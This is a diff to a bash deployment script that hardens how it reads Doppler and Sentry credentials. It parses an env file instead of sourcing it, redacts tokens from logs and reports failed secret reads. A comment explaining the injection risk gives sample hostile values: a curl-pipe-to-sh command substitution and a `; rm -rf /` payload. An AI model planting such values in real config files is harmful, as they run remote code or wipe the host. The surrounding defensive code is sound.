@@ -26,6 +26,49 @@ set -m
 
 readonly LOG_TAG="ci-deploy"
 
+# --- #7095: pick up the re-deliverable Doppler credential -----------------------------
+# webhook.service's EnvironmentFile is /etc/default/webhook-deploy, whose DOPPLER_TOKEN was
+# revoked 2026-07-30T11:19:30.614Z with no re-delivery path. This reads the re-deliverable
+# sibling so the value this deploy runs on can be refreshed by a terraform apply. Later-wins:
+# it overrides what the unit exported.
+#
+# PARSED, NOT SOURCED — and that is a security property, not a style choice.
+# `. /etc/default/soleur-doppler-token` would hand the file to the BASH parser, which performs
+# command substitution: a line `SENTRY_PROJECT_ID=$(curl -s http://x|sh)` executes as the
+# `deploy` user, which holds NOPASSWD sudo on infra-config-install and inngest-bootstrap.sh —
+# root on a host with no replacement path. An earlier revision of this block DID source it, with
+# a comment claiming the installer's `envfile_shape` check made that safe. It does not: that
+# check validates for systemd EnvironmentFile parseability, a DIFFERENT grammar. Measured — it
+# ACCEPTS `SENTRY_PROJECT_ID=$(echo PWNED)` and `DOPPLER_TOKEN=dp.st.X; rm -rf /`, and bash then
+# runs both. Three of the four values here are interpolated from var.sentry_dsn, whose regex
+# capture classes admit `$`, `(`, `)` and backtick.
+#
+# The loop below assigns only the four keys it recognises and never evaluates the value, so a
+# hostile or malformed line is inert data rather than code. This removes the class; the
+# defence-in-depth layers (the terraform plan validation on var.doppler_token and var.sentry_dsn,
+# and the installer's shape rejection) remain, but nothing here depends on them being complete.
+#
+# `[ -r ]`-guarded and written as an `if` rather than `[ -r … ] && …`: the latter is a bare
+# trailing command whose exit status is 1 when the file is absent, which under this script's
+# `set -e` would abort the deploy outright rather than no-op.
+if [ -r /etc/default/soleur-doppler-token ]; then
+  while IFS='=' read -r _cred_k _cred_v; do
+    case "$_cred_k" in
+      DOPPLER_TOKEN|SENTRY_INGEST_DOMAIN|SENTRY_PROJECT_ID|SENTRY_PUBLIC_KEY)
+        # Skip an empty value rather than blanking a working one. `EnvironmentFile=-` tolerates
+        # ABSENT and UNREADABLE but NOT empty-valued, and the installer's shape check accepts a
+        # bare `KEY=` (measured), so this is the layer that actually holds that line.
+        # `if`, not `[ … ] && …`: the latter is a trailing command whose exit status is 1 when
+        # the value is empty, which under this script's `set -e` aborts the deploy. Exactly the
+        # trap already fixed in ci-deploy-wrapper.sh — and reintroduced here on the first pass.
+        if [ -n "$_cred_v" ]; then printf -v "$_cred_k" '%s' "$_cred_v"; fi
+        ;;
+    esac
+  done < /etc/default/soleur-doppler-token
+  export DOPPLER_TOKEN SENTRY_INGEST_DOMAIN SENTRY_PROJECT_ID SENTRY_PUBLIC_KEY
+  unset _cred_k _cred_v
+fi
+
 # Image signature verification (#5933 Item 4; #6005 private-GHCR + offline rework).
 # The running host pulls the app image by semver tag (ALLOWED_IMAGES); this
 # cosign-verifies its signature and runs the VERIFIED DIGEST (not the tag → closes
@@ -102,6 +145,18 @@ readonly COSIGN_TRUSTED_ROOT_HOST="${COSIGN_TRUSTED_ROOT_HOST:-/etc/soleur/cosig
 ZOT_REGISTRY_URL="${ZOT_REGISTRY_URL:-}"           # e.g. 10.0.1.30:5000 (schemeless host:port); empty ⇒ zot disabled
 ZOT_ACTIVE=0                                        # set to 1 by zot_gate_and_login iff /v2/ probe + pull login both succeed
 readonly ZOT_PROBE_TIMEOUT="${ZOT_PROBE_TIMEOUT:-3}" # seconds for the /v2/ reachability probe
+# #7095: WHY the gate's outcome is a global rather than a return code. `zot_gate_and_login` is
+# invoked as a BARE STATEMENT under `set -euo pipefail`, so any non-zero return from it is a NEW
+# ABORT PATH — and an abort path on the credential-recovery path itself would break deploys for a
+# reason unrelated to the credential. The gate therefore keeps returning 0 always (its documented
+# fail-open contract) and reports WHICH outcome it took here.
+#   dark             — nothing to ask with; genuinely pre-provisioning (the ONLY state that may
+#                      still claim that wording)
+#   cred_read_failed — a DOPPLER_TOKEN was present and the read still produced nothing: the host
+#                      cannot read its own credential source
+#   probe_unreachable / login_failed / active — as before
+ZOT_GATE_STATUS="dark"
+readonly DOPPLER_GET_TIMEOUT="${DOPPLER_GET_TIMEOUT:-45}"   # per-attempt cap on one `doppler secrets get`
 
 # Sentinel exit codes persisted in STATE_FILE. Consumed by cat-deploy-state.sh
 # and the GitHub Actions "Verify deploy script completion" step. Keep in sync
@@ -1105,6 +1160,118 @@ _docker_login_http_status() {
   printf '%s' "${1:-}" | grep -oE 'status:[[:space:]]*[45][0-9]{2}' | grep -oE '[45][0-9]{2}' | head -1 || true
 }
 
+# _cred_err_tail <raw-stderr> (#7095): render a `doppler secrets get` stderr into something that
+# is SAFE to put on a sink which leaves the box. journald tag `ci-deploy` is allowlisted by
+# vector.toml and shipped to Better Stack UNSCRUBBED, so this is a credential boundary exactly
+# like the Sentry POST that _docker_login_failure_class guards. Three bounds, and the order of
+# the last two is load-bearing:
+#   1. every control character and non-ASCII byte -> a single space. A raw CR/ESC on a log line
+#      is both a terminal-injection vector and a record-splitter for the collector. `"` -> `'` so
+#      the value can never terminate the err="…" field it is emitted into.
+#   2. redact any `dp.st.`-prefixed substring. That is Doppler's own service-token prefix — i.e.
+#      precisely what an "invalid token: dp.st.…" style error echoes straight back at us.
+#   3. THEN bound to the last 200 bytes. REDACTION MUST PRECEDE TRUNCATION: truncating first can
+#      cut the `dp.st.` prefix off the front of a token and leave an unredactable remainder as
+#      the tail — the redactor would then have nothing left to match on.
+# The TAIL and not the head, because a CLI error puts its cause at the end, not the front.
+_cred_err_tail() {
+  local _e
+  _e="$(printf '%s' "${1:-}" \
+    | LC_ALL=C tr -c '[:print:]' ' ' \
+    | LC_ALL=C tr '"' "'" \
+    | sed -E 's/dp\.[a-z]{2,}\.[A-Za-z0-9._-]*/dp.REDACTED/g')"
+  # Bash does NOT clamp a negative substring offset: `${_e: -200}` on a 12-byte string yields the
+  # EMPTY string, not the whole string (the same trap `_login_hatch` documents and that
+  # ci-deploy.test.sh pins). Hence the explicit length test rather than the idiomatic one-liner.
+  if (( ${#_e} > 200 )); then _e="${_e:$(( ${#_e} - 200 ))}"; fi
+  printf '%s' "$_e"
+}
+
+# _doppler_get_observed <SECRET_NAME> <DEST_VAR> (#7095): read one prd secret and MEASURE the
+# read. Assigns the value to DEST_VAR (via `printf -v`, NOT a command substitution — the call
+# sites need the measurements, and a `$( )` subshell would discard every global set here) and
+# sets three observations:
+#   CRED_RC    — doppler's exit code, or 'parse_error'
+#   CRED_EMPTY — 1 when stdout was empty, 0 otherwise
+#   CRED_ERR   — the bounded / control-stripped / dp.st.-redacted stderr tail
+# Returns 0 iff the read produced a value.
+#
+# The stderr is what this exists for. Before #7095 all three zot-gate reads ended in
+# `2>/dev/null || true`, so on 2026-07-30 the host emitted "ZOT_REGISTRY_URL unset — GHCR path
+# (dark, pre-provisioning)" on eight consecutive releases while the actual cause — a revoked
+# service token — was being thrown away one character at a time.
+#
+# Record shape `<stderr>\036<rc>\036<value>`, parsed from the END with ##/% so an RS occurring
+# inside the stderr cannot corrupt the rc or the value. Precedent and mechanism:
+# _docker_login_capture — including its reason for using no temp file at all. A bare `mktemp` is
+# an abort vector under `set -e` when /tmp is full, i.e. the instrument would wedge the deploy in
+# one of the scenarios it exists to diagnose.
+_doppler_get_observed() {
+  local _name="${1:-}" _dest="${2:-}"
+  local _rec _rc=0 _r1 _val _o=""
+  CRED_RC=""; CRED_EMPTY=1; CRED_ERR=""
+  # stdout -> the INNER $( ) -> $_o, the secret VALUE; it reaches $_dest and never a sink.
+  # stderr -> fd3 -> the OUTER $( ) -> the head of the record.
+  _rec="$( { _o="$(timeout "$DOPPLER_GET_TIMEOUT" doppler secrets get "$_name" --plain --project soleur --config prd 2>&3 3>&-)" || _rc=$?; printf '\036%s\036%s' "$_rc" "$_o"; } 3>&1 )"
+  _val="${_rec##*$'\036'}"
+  _r1="${_rec%$'\036'*}"
+  CRED_RC="${_r1##*$'\036'}"
+  CRED_ERR="$(_cred_err_tail "${_r1%$'\036'*}")"
+  # Numeric guard, same standard the login capture is held to: "rc can never echo input" is
+  # STRUCTURAL here rather than argued from the end-anchored parse alone.
+  case "$CRED_RC" in ''|*[!0-9]*) CRED_RC='parse_error' ;; esac
+  if [[ -n "$_val" ]]; then CRED_EMPTY=0; else CRED_EMPTY=1; fi
+  printf -v "$_dest" '%s' "$_val"
+  [[ "$CRED_RC" == "0" && "$CRED_EMPTY" == "0" ]]
+}
+
+# _doppler_get_or_report <SECRET_NAME> <DEST_VAR> [tries] [sleep] [retry_on_empty] (#7095): read
+# a prd secret, retry a bounded number of times on a failed read, and — when it is still failing
+# — SAY SO on journald instead of silently yielding an empty string. Returns 0 iff a value was
+# obtained.
+#
+#   SOLEUR_DEPLOY_CRED_FAIL secret=<NAME> rc=<n> empty=<0|1> err="<bounded stderr tail>"
+#
+# WHY RETRY, AND WHY BOUNDED (R25). `zot_gate_and_login` is annotated "Fail-open: never aborts
+# the deploy", and cloud-init bakes /etc/default/soleur-ghcr-read SPECIFICALLY so a cold-boot
+# deploy proceeds when Doppler answers empty at the boot instant. A transient Doppler blip must
+# therefore never change the OUTCOME of a deploy; a bounded retry absorbs the blip so it cannot
+# be MISREPORTED as a dead credential. It is not an outage-waiting loop: the caller degrades onto
+# exactly the path it took before either way. The zot-gate callers pass the default 2/2s (that
+# path had NO retry at all before); the GHCR prelude callers pass 3/5s, which is byte-for-byte
+# the schedule its hand-rolled `until` loops already used — this replaced the loops to gain the
+# measurement, NOT to change the timing.
+#
+# DELIBERATELY NOT A CLASSIFIER. An earlier draft mapped the stderr onto
+# auth|network|config_dir|notfound|unknown. Cut, and the reasons are binding on anyone editing
+# this: (a) the tail is a SUPERSET of the class — the class is derived FROM the tail, so emitting
+# the tail loses nothing and drops a mapping table that silently degrades to `unknown` on the next
+# doppler release; (b) `config_dir` is provably dead on this surface (the unit runs
+# PrivateTmp=true, which makes the #6536 class structurally impossible here); (c) decisively, the
+# enum has NO FIELD for `rc=0 empty=1` — the shape the host's own vector.service suggests is the
+# live one, since `doppler run` kept exec'ing off the same dead EnvironmentFile throughout the
+# incident. Observation first. A taxonomy can be derived later from tails somebody has read.
+_doppler_get_or_report() {
+  local _name="${1:-}" _dest="${2:-}" _tries="${3:-2}" _nap="${4:-2}" _retry_empty="${5:-0}" _n=1
+  while :; do
+    _doppler_get_observed "$_name" "$_dest" && return 0
+    # `[[ … ]] && break` (not `(( … ))`): under `set -e` the failing test is not the LAST command
+    # of the AND-list, so it cannot abort — the same idiom the prelude's retry loops already use.
+    [[ "$_n" -ge "$_tries" ]] && break
+    # R25's "keys on rc, not on a taxonomy". A NON-ZERO rc is the shape a transient/network blip
+    # takes, and it is the only shape a retry can fix. An rc=0 read that returned nothing is not
+    # transient — the server answered, cleanly, with nothing — so retrying it only spends deploy
+    # wall-clock to learn the same fact twice. The GHCR prelude opts INTO the empty retry (arg 5)
+    # because its hand-rolled loops already did exactly that for #6090's cold-boot case, where
+    # Doppler answers EMPTY at the boot instant and a retry genuinely recovers.
+    [[ "$CRED_RC" != "0" || "$_retry_empty" == "1" ]] || break
+    _n=$(( _n + 1 ))
+    sleep "$_nap"
+  done
+  logger -t "$LOG_TAG" "SOLEUR_DEPLOY_CRED_FAIL secret=${_name} rc=${CRED_RC} empty=${CRED_EMPTY} err=\"${CRED_ERR}\""
+  return 1
+}
+
 # zot_gate_degraded_event <reason> [login_class] [login_http] [login_hatch]: WARNING beacon for when zot is CONFIGURED
 # (ZOT_REGISTRY_URL present) but the dark-launch gate could not activate it — the fleet
 # silently reverts to the GHCR path on the frequent rolling-deploy path WITHOUT a
@@ -1253,7 +1420,7 @@ ghcr_prelude_and_login() {
   # retry) to match cloud-init's ghcr_login. GHCR_READ_USER is a username (safe to export);
   # the TOKEN reaches `docker login` via --password-stdin only and is unset so no child env
   # (docker/cosign subprocess) ever carries it.
-  local k n ghcr_user="" ghcr_token=""
+  local k ghcr_user="" ghcr_token=""
   # SOLEUR_GHCR_READ_FILE overrides the baked-cred path for tests ONLY; production is the
   # unchanged /etc/default/soleur-ghcr-read (cloud-init writes it deploy:deploy 0600).
   local ghcr_read_file="${SOLEUR_GHCR_READ_FILE:-/etc/default/soleur-ghcr-read}"
@@ -1264,18 +1431,44 @@ ghcr_prelude_and_login() {
     unset GHCR_READ_TOKEN   # keep the token out of THIS process env + its children
   fi
   if command -v doppler >/dev/null 2>&1 && [[ -n "${DOPPLER_TOKEN:-}" ]]; then
-    # SENTRY_* prefetch for the verify/pull telemetry curls (dark event if absent, as today).
+    # SENTRY_* refresh for the verify/pull telemetry curls.
+    #
+    # #7095 — PREFER THE BAKED VALUE; NEVER OVERWRITE IT WITH AN EMPTY READ. This loop used to be
+    # `printf -v "$k" '%s' "$(doppler … 2>/dev/null || true)"`, which is an UNCONDITIONAL
+    # assignment: on a revoked token the read yields "" and `printf -v` writes that empty string
+    # over the value sourced from /etc/default/soleur-doppler-token at the top of this script
+    # (verified: `X=preset; printf -v X %s "$(false || true)"` leaves X empty — bash does not skip
+    # the assignment). Because ghcr_prelude_and_login runs BEFORE zot_gate_and_login and before
+    # every pull/verify emitter, that blanked all seven `[[ -n $SENTRY_INGEST_DOMAIN && … ]]`
+    # guards and took the host Sentry-dark — silently destroying, ~1400 lines later, the exact
+    # mitigation the baking exists to provide. It is why 341 unit failures over 5.7h paged nobody.
+    #
+    # Now: read through the instrument, and assign ONLY on a non-empty result. A failed read is
+    # reported (SOLEUR_DEPLOY_CRED_FAIL) and leaves the baked value standing. `2 2 0` = 2 attempts,
+    # 2s apart, no empty-retry — an rc=0 empty read is the server answering cleanly with nothing,
+    # which a retry cannot fix, and these three have a baked fallback so there is nothing to wait for.
     for k in SENTRY_INGEST_DOMAIN SENTRY_PROJECT_ID SENTRY_PUBLIC_KEY; do
       # `secrets get <NAME> --plain` returns the bare value on stdout (never argv).
-      printf -v "$k" '%s' "$(doppler secrets get "$k" --plain --project soleur --config prd 2>/dev/null || true)"
+      _sentry_v=""
+      _doppler_get_or_report "$k" _sentry_v 2 2 0 || true
+      if [[ -n "$_sentry_v" ]]; then printf -v "$k" '%s' "$_sentry_v"; fi
       export "$k"
     done
+    unset _sentry_v
     # Hardened Doppler fallback for any GHCR cred the bake did not supply.
+    # #7095: the hand-rolled `until` loops here were `2>/dev/null` — 3 attempts, and if all three
+    # came back empty the function simply carried on with an empty string and let the "not both
+    # present" line below name two causes it had measured neither of. `_doppler_get_or_report`
+    # keeps the schedule IDENTICAL (3 tries, 5s apart — the same shape cloud-init's ghcr_login
+    # uses) and adds the one thing that was missing: it says rc, empty and the stderr tail.
+    # `|| true` is load-bearing under `set -e`: a failed read is NOT fatal here — the pull's own
+    # failure path and pull_failure_event surface it loudly, and the baked-cred cold-boot path
+    # (#6090) depends on this function staying fail-open.
     if [[ -z "$ghcr_user" ]]; then
-      n=0; until ghcr_user="$(timeout 45 doppler secrets get GHCR_READ_USER --plain --project soleur --config prd 2>/dev/null)"; [[ -n "$ghcr_user" ]]; do n=$((n + 1)); [[ "$n" -ge 3 ]] && break; sleep 5; done
+      _doppler_get_or_report GHCR_READ_USER ghcr_user 3 5 1 || true
     fi
     if [[ -z "$ghcr_token" ]]; then
-      n=0; until ghcr_token="$(timeout 45 doppler secrets get GHCR_READ_TOKEN --plain --project soleur --config prd 2>/dev/null)"; [[ -n "$ghcr_token" ]]; do n=$((n + 1)); [[ "$n" -ge 3 ]] && break; sleep 5; done
+      _doppler_get_or_report GHCR_READ_TOKEN ghcr_token 3 5 1 || true
     fi
   elif [[ -z "$ghcr_user" || -z "$ghcr_token" ]]; then
     logger -t "$LOG_TAG" "PRELUDE: doppler/DOPPLER_TOKEN unavailable and baked GHCR creds incomplete — skipping GHCR login + SENTRY prefetch"
@@ -1326,7 +1519,16 @@ ghcr_prelude_and_login() {
       fi
     fi
   else
-    logger -t "$LOG_TAG" "PRELUDE: GHCR_READ_{USER,TOKEN} not both present (baked file absent + doppler empty/unavailable) — skipping docker login"
+    # #7095: this line USED to assert its own cause — "(baked file absent + doppler
+    # empty/unavailable)" — while measuring neither half of it. It is the line web-1 printed on
+    # all eight failed releases of 2026-07-30, and it was wrong about the first half on every
+    # one of them. It now reports what was actually observed; the per-secret
+    # SOLEUR_DEPLOY_CRED_FAIL markers above carry rc/empty/err for each read that came back with
+    # nothing. The `PRELUDE: GHCR_READ_{USER,TOKEN} not both present` prefix is preserved
+    # verbatim so existing journald searches and runbooks still find it.
+    local _baked="absent"
+    [[ -r "$ghcr_read_file" ]] && _baked="present"
+    logger -t "$LOG_TAG" "PRELUDE: GHCR_READ_{USER,TOKEN} not both present (baked_file=$_baked user_empty=$([[ -z "$ghcr_user" ]] && echo 1 || echo 0) token_empty=$([[ -z "$ghcr_token" ]] && echo 1 || echo 0)) — skipping docker login"
   fi
   # The mounted $GHCR_DOCKER_CONFIG (inline auths entry) is what the cosign verifier
   # reuses; the token local goes out of scope when the function returns.
@@ -1353,28 +1555,65 @@ ghcr_prelude_and_login() {
 # defect class this change exists to fix.
 zot_gate_and_login() {
   ZOT_ACTIVE=0
-  command -v doppler >/dev/null 2>&1 || return 0
-  [[ -n "${DOPPLER_TOKEN:-}" ]] || return 0
-  [[ -n "$ZOT_REGISTRY_URL" ]] || \
-    ZOT_REGISTRY_URL="$(doppler secrets get ZOT_REGISTRY_URL --plain --project soleur --config prd 2>/dev/null || true)"
-  if [[ -z "$ZOT_REGISTRY_URL" ]]; then
-    logger -t "$LOG_TAG" "ZOT_GATE: ZOT_REGISTRY_URL unset — GHCR path (dark, pre-provisioning)"
+  ZOT_GATE_STATUS="dark"
+  # #7095 / plan 1.3b — THE GENERALISABLE RULE THIS INCIDENT TEACHES:
+  #   ABSENCE OF A VALUE MUST NEVER SILENTLY SELECT A CODE PATH.
+  # On 2026-07-30 this gate read an EMPTY `ZOT_REGISTRY_URL` as a meaningful CONFIGURATION state
+  # ("dark, pre-provisioning"), never contacted zot at all, and fell through to an
+  # unauthenticated GHCR pull of a private package — eight releases in a row, all under one
+  # reason string, because the value was empty for a reason the code never asked about: the
+  # host's boot-baked Doppler service token had been revoked.
+  # So the dark branch now requires an explicit POSITIVE SENTINEL: there is genuinely nothing to
+  # ask WITH (no doppler binary, or no DOPPLER_TOKEN) *and* no URL already in the env. That is
+  # the only state permitted to claim pre-provisioning. Everything else — a token was present and
+  # the read still produced nothing — is reported below as the read failure it is. The rule is
+  # about EMPTY, not about zot: without it the next empty secret re-enters the same silent
+  # fall-through under a different name.
+  if ! command -v doppler >/dev/null 2>&1 || [[ -z "${DOPPLER_TOKEN:-}" ]]; then
+    if [[ -z "$ZOT_REGISTRY_URL" ]]; then
+      logger -t "$LOG_TAG" "ZOT_GATE: ZOT_REGISTRY_URL unset and no Doppler credential to read one with — GHCR path (dark, pre-provisioning)"
+    fi
     return 0
+  fi
+  if [[ -z "$ZOT_REGISTRY_URL" ]]; then
+    if ! _doppler_get_or_report ZOT_REGISTRY_URL ZOT_REGISTRY_URL; then
+      # THE line whose absence made eight consecutive failures unreadable. It is deliberately
+      # NOT terminal: `return 0` keeps this function's documented fail-open contract (a new abort
+      # path here would break deploys for reasons unrelated to the credential, and would make the
+      # #6090 baked-cred cold-boot path unreachable). Observability only — same control flow,
+      # but it now says why. The terminal `doppler_read_failed` reason is a separate, later PR.
+      ZOT_GATE_STATUS="cred_read_failed"
+      logger -t "$LOG_TAG" "ZOT_GATE: doppler read FAILED rc=${CRED_RC} empty=${CRED_EMPTY} — the host cannot read its own credential source (NOT pre-provisioning)"
+      # #7095 — SECOND, CREDENTIAL-INDEPENDENT TRANSPORT. journald→Vector→Better Stack is not
+      # enough on its own here: vector.service runs `doppler run -- vector` off the SAME token and
+      # survives only because it started before the revocation, so any restart takes this marker's
+      # sole route off the box with it. The Sentry emit uses the BAKED DSN components, which now
+      # survive a dead token (see ghcr_prelude_and_login), giving two independent vendors again.
+      zot_gate_degraded_event cred_read_failed
+      return 0
+    fi
   fi
   # Reachability probe: a live OCI registry answers /v2/ with 200 (open) or 401 (auth
   # required); a down/unreachable host yields 000 (curl connect failure) → GHCR path.
   local code
   code="$(curl -s -o /dev/null -w '%{http_code}' --max-time "$ZOT_PROBE_TIMEOUT" "http://${ZOT_REGISTRY_URL}/v2/" 2>/dev/null || echo 000)"
   if [[ "$code" != "200" && "$code" != "401" ]]; then
+    ZOT_GATE_STATUS="probe_unreachable"
     logger -t "$LOG_TAG" "ZOT_GATE: /v2/ probe http=$code — GHCR path (zot unreachable)"
     zot_gate_degraded_event probe_unreachable
     return 0
   fi
-  local zuser ztoken
-  zuser="$(doppler secrets get ZOT_PULL_USER --plain --project soleur --config prd 2>/dev/null || true)"
-  ztoken="$(doppler secrets get ZOT_PULL_TOKEN --plain --project soleur --config prd 2>/dev/null || true)"
-  if [[ -z "$zuser" || -z "$ztoken" ]]; then
-    logger -t "$LOG_TAG" "ZOT_GATE: ZOT_PULL_{USER,TOKEN} not both present — GHCR path"
+  # #7095: the same treatment as the URL read above. These two were also `2>/dev/null || true`,
+  # so "not both present" was the only thing the fleet ever learned about a pull cred that could
+  # not be read — indistinguishable from one that was never provisioned. Both reads are attempted
+  # unconditionally (no short-circuit) so BOTH markers land: knowing that the user read fine and
+  # only the token did not is a different diagnosis from neither answering.
+  local zuser="" ztoken="" zu_ok=1 zt_ok=1
+  _doppler_get_or_report ZOT_PULL_USER  zuser  || zu_ok=0
+  _doppler_get_or_report ZOT_PULL_TOKEN ztoken || zt_ok=0
+  if [[ "$zu_ok" == "0" || "$zt_ok" == "0" ]]; then
+    ZOT_GATE_STATUS="cred_read_failed"
+    logger -t "$LOG_TAG" "ZOT_GATE: ZOT_PULL_{USER,TOKEN} not both present — doppler read FAILED (user_ok=$zu_ok token_ok=$zt_ok) — GHCR path (see the per-secret SOLEUR_DEPLOY_CRED_FAIL markers for rc/empty/err)"
     ztoken=""
     zot_gate_degraded_event creds_absent
     return 0
@@ -1389,8 +1628,10 @@ zot_gate_and_login() {
   # which IS hypothesis H-C: the instrument would wedge prod in the scenario it diagnoses).
   if _docker_login_capture "$ZOT_REGISTRY_URL" "$zuser" "$ztoken"; then
     ZOT_ACTIVE=1
+    ZOT_GATE_STATUS="active"
     logger -t "$LOG_TAG" "ZOT_GATE: active — docker login $ZOT_REGISTRY_URL ok (zot-primary)"
   else
+    ZOT_GATE_STATUS="login_failed"
     local zclass zhttp zhatch
     zclass="$(_docker_login_failure_class "${LOGIN_ERR:-}")"
     zhttp="$(_docker_login_http_status "${LOGIN_ERR:-}")"
